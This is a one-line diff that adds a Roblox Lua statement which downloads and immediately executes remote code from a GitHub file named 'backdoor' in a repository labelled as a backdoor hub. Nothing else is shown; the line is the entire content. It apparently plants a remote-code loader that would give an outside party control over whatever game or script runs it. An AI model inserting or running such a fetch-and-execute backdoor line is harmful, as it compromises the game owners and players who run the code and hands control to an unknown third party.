@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Vata909tt/Vata909tt-HUB-Backdoor/refs/heads/main/backdoor"))()
